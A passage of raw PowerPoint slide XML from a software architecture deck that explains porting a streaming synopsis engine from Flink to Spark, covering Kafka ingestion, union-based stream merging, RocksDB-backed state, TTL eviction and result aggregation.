          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3E5F5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437626" y="4160520"/>
            <a:ext cx="109728" cy="47548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602218" y="4156709"/>
            <a:ext cx="19705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PURPLE PATH  noOfP &gt; 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02218" y="4315968"/>
            <a:ext cx="19705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6A1B9A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Collect N partials  →  merge via </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="750" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6A1B9A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ReduceAggregator</a:t>
            </a:r>
            <a:endParaRPr sz="750" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="6A1B9A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ED62AA7-E38E-DDE8-47A4-CDA7DCC4178A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B1A03CA-AB89-2B02-CC69-6F523F9D628D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SDE_Spark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Architecture  |  March 2026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E06C361-6FB0-C740-E10D-44737242C73F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Key Design Challenge — Union + Discriminator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CAF9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Spark has no CoFlatMap — this is how we merge two streams into one stateful operator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96112"/>
            <a:ext cx="11823192" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF8E1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896112"/>
            <a:ext cx="128016" cy="49377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932688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E3600"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Challenge:  Flink's CoFlatMap natively joins two typed streams into one stateful operator. Spark only accepts a single stream per stateful stage — we need a workaround.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481328"/>
            <a:ext cx="5486400" cy="4572000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F8F2"/>
          </a:solidFill>
          <a:ln w="762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33872" y="1481328"/>
            <a:ext cx="6172200" cy="4572000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F0F6FF"/>
          </a:solidFill>
          <a:ln w="762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" y="1481328"/>
            <a:ext cx="548640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" y="15453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FLINK  —  Native CoFlatMap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33872" y="1481328"/>
            <a:ext cx="6172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33872" y="1545336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SPARK  —  Union + Discriminator  (our solution)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11680"/>
            <a:ext cx="2194560" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="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1396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6B2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DataStream&lt;Datapoint&gt;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011680"/>
            <a:ext cx="2194560" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="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73552" y="21396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6B2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DataStream&lt;Request&gt;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2542032"/>
            <a:ext cx="219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AE"/>
                </a:solidFill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2542032"/>
            <a:ext cx="219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AE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2852928"/>
            <a:ext cx="4974336" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2E7D32"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="1B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" y="2935224"/>
            <a:ext cx="4828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CoFlatMap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191256"/>
            <a:ext cx="48280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native dual-input stateful operator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3511296"/>
            <a:ext cx="219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AE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840480"/>
            <a:ext cx="4974336" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C8E6C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3968496"/>
            <a:ext cx="4828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2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Output Stream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90288"/>
            <a:ext cx="5120640" cy="585216"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DCEDC8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4590288"/>
            <a:ext cx="91440" cy="58521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645152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6B2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Clean and direct.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4864608"/>
            <a:ext cx="4956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6B2F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Two typed streams feed one operator natively. No workarounds.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011680"/>
            <a:ext cx="2606040" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="BBDEFB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08192" y="213969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D8C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dataset&lt;Datapoint&gt;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98863" y="2011680"/>
            <a:ext cx="2606040" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="BBDEFB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72015" y="213969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3D8C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dataset&lt;Request&gt;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8332" y="2542032"/>
            <a:ext cx="219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AE"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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92156" y="2542032"/>
            <a:ext cx="219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AE"/>
                </a:solidFill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2816352"/>
            <a:ext cx="2606040" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1565C0"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="0D3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08192" y="291693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tag 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98863" y="2816352"/>
            <a:ext cx="2606040" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1565C0"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="0D3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72015" y="291693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tag  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8332" y="3291840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AE"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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92156" y="3291840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AE"/>
                </a:solidFill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547872"/>
            <a:ext cx="5769863" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1565C0"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="0D3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08192" y="3566159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union()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08192" y="3822191"/>
            <a:ext cx="5623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</a:rPr>
              <a:t>merge into single stream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0244" y="4078224"/>
            <a:ext cx="219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AE"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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352544"/>
            <a:ext cx="5769863" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="BBDEFB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08192" y="4370831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D8C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dataset&lt;InputEvent&gt;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08192" y="4626864"/>
            <a:ext cx="5623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D3D8C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>each event knows if it is DATA or REQUEST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10244" y="488289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A4AE"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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5138928"/>
            <a:ext cx="5769863" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D3D8C"/>
          </a:solidFill>
          <a:ln w="15240">
            <a:solidFill>
              <a:srgbClr val="0D2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08192" y="5175504"/>
            <a:ext cx="5623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</a:rPr>
              <a:t>flatMapGroupsWithState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08192" y="5431536"/>
            <a:ext cx="5623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dispatch: isData() ? add() : estimate()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16752" y="5888736"/>
            <a:ext cx="5806440" cy="585216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016752" y="5888736"/>
            <a:ext cx="91440" cy="58521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63056" y="5943600"/>
            <a:ext cx="5641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D8C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Workaround, but clean.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63056" y="6163056"/>
            <a:ext cx="5641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D8C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tag → union → dispatch inside the stateful function. Same result.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BFD1E60-E3BF-7F31-284A-F670E36B98FC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A8B8C0-1575-838F-5850-5DA44671534D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SDE_Spark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Architecture  |  March 2026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9FE165-F460-34D5-1586-18FBA4657792}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4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1  —  Ingestion &amp;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CEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Consume raw JSON from Kafka  |  Deserialize to typed Java objects  |  Stateless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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5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207008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Two readStream.format("kafka") sources — one per Kafka topic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28216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60934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selectExpr("CAST value AS STRING") — raw bytes converted to UTF-8 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30552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01168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map() + Jackson 2.15+ ObjectMapper — JSON string deserialized to typed POJO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32888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414016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data_topic    →  Datapoint  (dataSetkey, streamID, values)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35224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81635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request_topic →  Request   (synopsisID ∈ {1,2,3,4}, requestID, uid, param, noOfP)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37560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218688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Invalid messages: logged and filtered — never reach stateful layers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57600"/>
            <a:ext cx="5486400" cy="2816352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="30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5486400" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="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6850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alibri"/>
              </a:rPr>
              <a:t> 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950208"/>
            <a:ext cx="5120640" cy="2432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// Consume from Kafka, deserialize to Datapoint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Dataset&lt;Datapoint&gt; data = spark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.readStream()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.format("kafka")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.option("subscribe", dataTopic)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.load()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.selectExpr("CAST value AS STRING")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.map(json -&gt; mapper.readValue(json, Datapoint.class),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     Encoders.bean(Datapoint.class));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207008"/>
            <a:ext cx="257175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98230" y="1207008"/>
            <a:ext cx="3143250" cy="38404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261872"/>
            <a:ext cx="23888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SDE / Flink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9669" y="1261872"/>
            <a:ext cx="29603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SDE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 / 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Spark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591056"/>
            <a:ext cx="2571750" cy="635508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98230" y="1591056"/>
            <a:ext cx="3143250" cy="635508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1627632"/>
            <a:ext cx="2388870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FlinkKafkaConsumer&lt;String&gt;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9669" y="1627632"/>
            <a:ext cx="2960370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readStream.format("kafka")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226564"/>
            <a:ext cx="2571750" cy="635508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98230" y="2226564"/>
            <a:ext cx="3143250" cy="635508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2263140"/>
            <a:ext cx="2388870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DataStream&lt;String&gt;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9669" y="2263140"/>
            <a:ext cx="2960370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Dataset&lt;String&gt;  (Structured Streaming)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251960"/>
            <a:ext cx="5715000" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0F4F6"/>
          </a:solidFill>
          <a:ln w="1905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63640" y="43159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A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Design Note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62686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This layer is completely stateless — parsing failures are isolated here and never propagate to RocksDB-backed stateful layers downstream. The Jackson ObjectMapper is shared per-partition to avoid instantiation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2  —  Routing &amp;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CEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Combined request + data fan-out  |  Single stateful operator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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>6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207008"/>
            <a:ext cx="5303520" cy="2267712"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E3F0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207008"/>
            <a:ext cx="5303520" cy="40233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DataRouter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0512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69164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Receives BOTH Request and Datapoint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94560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075688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Registers parallelism  |  Fans out requests to keyed partitions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78608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45973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Hashes data streamID  -&gt;  routes to key_0 ... key_(N-1)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62656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843784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State: RoutingState  (parallelism registry + routing table)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84448"/>
            <a:ext cx="5303520" cy="2267712"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFEBEE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584448"/>
            <a:ext cx="5303520" cy="402336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6301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RequestRouter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87952"/>
            <a:ext cx="64008" cy="640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06908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Merged into DataRouter  (no longer a separate operator)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72000"/>
            <a:ext cx="64008" cy="640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453128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Request fan-out now handled by DataRouter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956048"/>
            <a:ext cx="64008" cy="640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83717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Ensures routing state is in same partition as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340096"/>
            <a:ext cx="64008" cy="640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221224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Key insight: request + data must share partition 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1207008"/>
            <a:ext cx="2612898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02217" y="1207008"/>
            <a:ext cx="3193542" cy="38404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59" y="1261872"/>
            <a:ext cx="24300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SDE / Flink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93657" y="1261872"/>
            <a:ext cx="3010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SDE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 / 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Spark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1591056"/>
            <a:ext cx="2612898" cy="612648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602217" y="1591056"/>
            <a:ext cx="3193542" cy="612648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0759" y="1627632"/>
            <a:ext cx="243001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connect() + CoFlatMapFunction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3657" y="1627632"/>
            <a:ext cx="301066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union() + discriminator pattern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203704"/>
            <a:ext cx="2612898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02217" y="2203704"/>
            <a:ext cx="3193542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80759" y="2240280"/>
            <a:ext cx="243001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flatMap1() data / flatMap2() requests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93657" y="2240280"/>
            <a:ext cx="301066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Single flatMapGroupsWithState + if/else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2816352"/>
            <a:ext cx="2612898" cy="612648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02217" y="2816352"/>
            <a:ext cx="3193542" cy="612648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80759" y="2852928"/>
            <a:ext cx="243001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In-memory HashMap — lost on crash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93657" y="2852928"/>
            <a:ext cx="301066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In-memory GroupState (HashMap)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3429000"/>
            <a:ext cx="2612898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02217" y="3429000"/>
            <a:ext cx="3193542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80759" y="3465576"/>
            <a:ext cx="243001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Native two-stream Flink operator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93657" y="3465576"/>
            <a:ext cx="301066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Tag + union workaround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4160520"/>
            <a:ext cx="5806440" cy="16916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6480" y="42245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Why union + discriminator?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5720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Spark's flatMapGroupsWithState only accepts a single input stream. By tagging each event with its type (DATA or REQUEST) and unioning both streams into one Dataset&lt;InputEvent&gt;, we keep all routing logic inside a single stateful operator — which is exactly what Spark supports.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3  —  Synopsis Processing  ★ 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ECEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Lifecycle of all synopsis instances  |  The heart of SDE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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>7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207008"/>
            <a:ext cx="5303520" cy="278892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207008"/>
            <a:ext cx="5303520" cy="40233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SynopsisProcessor  —  Event Dispatch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0512"/>
            <a:ext cx="64008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691640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flatMapGroupsWithState  keyed on partitionKey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49424"/>
            <a:ext cx="64008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130552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DATA event       →  synopsis.add(datapoint)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88336"/>
            <a:ext cx="64008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569464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REQUEST  ADD     →  SynopsisFactory.create(synopsisID)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27248"/>
            <a:ext cx="64008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008376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REQUEST  ESTIMATE →  synopsis.estimate()  →  emit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66160"/>
            <a:ext cx="64008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447288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REQUEST  DELETE  →  remove from state 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98848"/>
            <a:ext cx="5303520" cy="1938528"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="30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498848"/>
            <a:ext cx="5303520" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="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alibri"/>
              </a:rPr>
              <a:t> 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91456"/>
            <a:ext cx="493775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case 1 -&gt; new CountMin(uid, params)             // ID 1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case 2 -&gt; new Bloomfilter(uid, params)          // ID 2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case 3 -&gt; new AMSsynopsis(uid, params)          // ID 3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case 4 -&gt; new HyperLogLogSynopsis(uid, params)  // ID 4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default -&gt; throw new UnsupportedSynopsisException(id)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" y="425196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E65100"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SynopsisFactory</a:t>
            </a:r>
            <a:endParaRPr sz="1100" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="E6510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89320" y="1207008"/>
            <a:ext cx="2612898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02217" y="1207008"/>
            <a:ext cx="3193542" cy="38404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59" y="1261872"/>
            <a:ext cx="24300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SDE / Flink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3657" y="1261872"/>
            <a:ext cx="3010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SDE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 / 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Spark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1591056"/>
            <a:ext cx="2612898" cy="576072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02217" y="1591056"/>
            <a:ext cx="3193542" cy="576072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59" y="1627632"/>
            <a:ext cx="24300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SDEcoFlatMap  RichCoFlatMapFunction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93657" y="1627632"/>
            <a:ext cx="30106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SynopsisProcessor  flatMapGroupsWithState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167128"/>
            <a:ext cx="2612898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602217" y="2167128"/>
            <a:ext cx="3193542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0759" y="2203704"/>
            <a:ext cx="24300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HashMap&lt;String, ArrayList&lt;Synopsis&gt;&gt;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3657" y="2203704"/>
            <a:ext cx="30106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GroupState&lt;SynopsisProcessorState&gt; + RocksDB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743200"/>
            <a:ext cx="2612898" cy="576072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02217" y="2743200"/>
            <a:ext cx="3193542" cy="576072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80759" y="2779776"/>
            <a:ext cx="24300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JVM heap — lost on crash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93657" y="2779776"/>
            <a:ext cx="30106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1A232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1100" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> on SSD + HDFS/S3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>/ADLS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1100" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> checkpoint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3319272"/>
            <a:ext cx="2612898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02217" y="3319272"/>
            <a:ext cx="3193542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80759" y="3355848"/>
            <a:ext cx="24300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switch(id) cases 1–29 + RCE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93657" y="3355848"/>
            <a:ext cx="30106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SynopsisFactory  — clean factory pattern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3895344"/>
            <a:ext cx="2612898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602217" y="3895344"/>
            <a:ext cx="3193542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80759" y="3931920"/>
            <a:ext cx="243001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No TTL / eviction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93657" y="3931920"/>
            <a:ext cx="301066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Activity-based TTL + 7-day safety net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19" y="4837176"/>
            <a:ext cx="5806440" cy="13258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26479" y="49011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Improvement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79" y="5221224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7474F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>State moves from JVM heap to </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="37474F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="37474F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> — decoupling state size from memory. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="37474F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SynopsisFactory</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="37474F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> replaces a 300-line switch statement and a critical RCE vulnerability. All Synopsis classes implement Serializable.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In-Memory State &amp;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ECEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>How SDE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>survives crashes and manages state at unlimited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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>8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207008"/>
            <a:ext cx="3749039" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFEBEE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207008"/>
            <a:ext cx="3749039" cy="43891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252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In-Memory  (Flink SDE)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1856231"/>
            <a:ext cx="64008" cy="640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1737360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HashMap stored in JVM heap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2295144"/>
            <a:ext cx="64008" cy="640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176272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Very fast access (no serialization)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2734056"/>
            <a:ext cx="64008" cy="640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2615184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Crash  =  total state loss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" y="3172968"/>
            <a:ext cx="64008" cy="640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3054096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Limited by heap size  (~GB)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207008"/>
            <a:ext cx="3749039" cy="32004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59" y="1207008"/>
            <a:ext cx="3749039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1252728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dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>RocksDB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 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Spark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SDE)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6551" y="1856231"/>
            <a:ext cx="64008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9431" y="1737360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Key-value store on local SSD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6551" y="2295144"/>
            <a:ext cx="64008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9431" y="2176272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Fast access  (~microseconds)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6551" y="2734056"/>
            <a:ext cx="64008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9431" y="2615184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Crash  =  state preserved on disk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6551" y="3172968"/>
            <a:ext cx="64008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9431" y="3054096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Limited by SSD capacity  (~TB)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1207008"/>
            <a:ext cx="3749039" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E3F0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83879" y="1207008"/>
            <a:ext cx="3749039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1252728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HDFS / S3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 / ADLS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 Checkpoint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8471" y="1856231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31351" y="1737360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Incremental snapshots of RocksDB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48471" y="2295144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31351" y="2176272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Survives full machine / disk loss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48471" y="2734056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31351" y="2615184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Configured via checkpointLocation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48471" y="3172968"/>
            <a:ext cx="64008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31351" y="3054096"/>
            <a:ext cx="3172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Spark auto-rehydrates on restart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  <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>State Flow: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846320"/>
            <a:ext cx="25603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79" y="4892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5100"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Every event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98648" y="4956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0BEC5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4846320"/>
            <a:ext cx="25603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46120" y="4892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Calibri"/>
              </a:rPr>
              <a:t>RocksDB  (SSD)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33288" y="4956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0BEC5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4846320"/>
            <a:ext cx="25603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80759" y="4892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565C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Every micro-batch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67928" y="4956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0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibr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60" y="4846320"/>
            <a:ext cx="25603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15400" y="4892040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565C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HDFS / S3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1565C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> / ADLS</a:t>
            </a:r>
            <a:endParaRPr sz="1200" b="1" i="0" dirty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20040" y="5440680"/>
            <a:ext cx="11548872" cy="10515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5504688"/>
            <a:ext cx="11183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State Timeout (TTL)  —  Automatic Cleanup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852160"/>
            <a:ext cx="11183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Activity-based: timer resets on every event  |  Optional ttl field per ADD request  (e.g. "24h", "7d")  |  7-day global safety net  |  Eviction notice (requestID = -1) emitted to Kafka before state.remove()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Layers 4 &amp; 5  —  Path Splitting &amp; Aggregation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CEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Route results to the right path  |  Merge partial results efficiently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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>9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207008"/>
            <a:ext cx="5303520" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEE8F8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207008"/>
            <a:ext cx="5303520" cy="40233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2527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Layer 4  —  PathSplitter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0512"/>
            <a:ext cx="64008" cy="6400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691640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Stateless filter() — no RocksDB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49424"/>
            <a:ext cx="64008" cy="6400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130552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noOfP == 1  →  GREEN PATH  (direct to output)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88336"/>
            <a:ext cx="64008" cy="6400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569464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noOfP &gt; 1   →  PURPLE PATH  (send to ReduceAggregator)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27248"/>
            <a:ext cx="64008" cy="6400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008376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noOfP is set at registration time — never changes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5303520" cy="2633472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530352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93192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Layer 5  —  ReduceAggregator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89704"/>
            <a:ext cx="64008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370832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flatMapGroupsWithState  keyed on request UID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28616"/>
            <a:ext cx="64008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809744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Collects noOfP partial Estimations, then merges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67528"/>
            <a:ext cx="64008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248656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groupByKey(uid)  →  fully distributed across cluster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06440"/>
            <a:ext cx="64008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687568"/>
            <a:ext cx="4709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E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Eliminates the parallelism=1 bottleneck from Flink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6625" y="1303527"/>
            <a:ext cx="5806440" cy="2463801"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="30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16625" y="1303527"/>
            <a:ext cx="5806440" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="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59" y="1312417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80A0C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> 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3914" y="1672590"/>
            <a:ext cx="5349112" cy="1474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 dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>synopsisID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> 1  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>CountMin</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>     →  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>SimpleSumFunction</a:t>
            </a:r>
            <a:endParaRPr sz="1050" dirty="0">
              <a:solidFill>
                <a:srgbClr val="A8D8A8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A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>                              (element-wise matrix addition)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>synopsisID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> 2  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>BloomFilter</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  →  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>SimpleORFunction</a:t>
            </a:r>
            <a:endParaRPr sz="1050" dirty="0">
              <a:solidFill>
                <a:srgbClr val="A8D8A8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A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>                              (bitwise OR of bit arrays)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
